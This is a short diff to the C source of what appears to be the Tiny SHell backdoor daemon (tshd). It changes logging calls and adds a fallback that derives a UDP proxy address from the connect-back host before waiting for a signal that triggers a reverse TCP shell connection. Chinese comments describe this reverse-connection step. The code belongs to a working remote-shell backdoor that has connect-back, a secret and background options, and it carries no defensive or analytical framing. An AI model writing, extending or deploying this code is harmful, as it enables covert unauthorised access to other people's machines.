@@ -56,14 +56,13 @@ int tshd_runshell( int client );
 
 void usage(char *argv0)
 {
-    fprintf(stderr, "Usage: %s [ -c [ connect_back_host ] ] [ -s secret ] [ -p port ]\n", argv0);
-    fprintf(stderr, "Usage: %s [ -f [ forgound, backgound as default ]\n", argv0);
+    info("Usage: %s [ -c [ connect_back_host ] ] [ -s secret ] [ -p port ]\n", argv0);
+    info("Usage: %s [ -f [ forgound, backgound as default ]\n", argv0);
     exit(1);
 }
 
 int hasWaitConnectSignal(int udpSock, struct sockaddr_in *udpAddr, struct sockaddr_in *outServer) {
 	static time_t lastHeartBeatTime;
-#define MAX_UDP_HEARTBEAT (1 * 60)
 
 	if (time(NULL) - lastHeartBeatTime > MAX_UDP_HEARTBEAT) {
 		struct tshProtocol data;
@@ -269,12 +268,15 @@ int main( int argc, char **argv )
 	    {
 			struct sockaddr_in sServer;
 			if (proxyUdp) {
+				if (udpAddr.sin_family == AF_UNSPEC || udpAddr.sin_port == 0) {
+					udpAddr = parseHostAndPort(cb_host, UDP_ProxyPort);
+				}
 				/* 如果UDP发送过来了反向连接的ip:port */
 				if(hasWaitConnectSignal(udpServer, &udpAddr, &sServer) != 0) {
 					// 如果没有反向连接数据.
 					continue;
 				}
-				printf("udp got tcp addr " IPBLabel " and begin to connect\n", IPBValue(sServer));
+				info("udp got tcp addr " IPBLabel " and begin to connect\n", IPBValue(sServer));
 			} else {
 				sleep( CONNECT_BACK_DELAY );
 			}
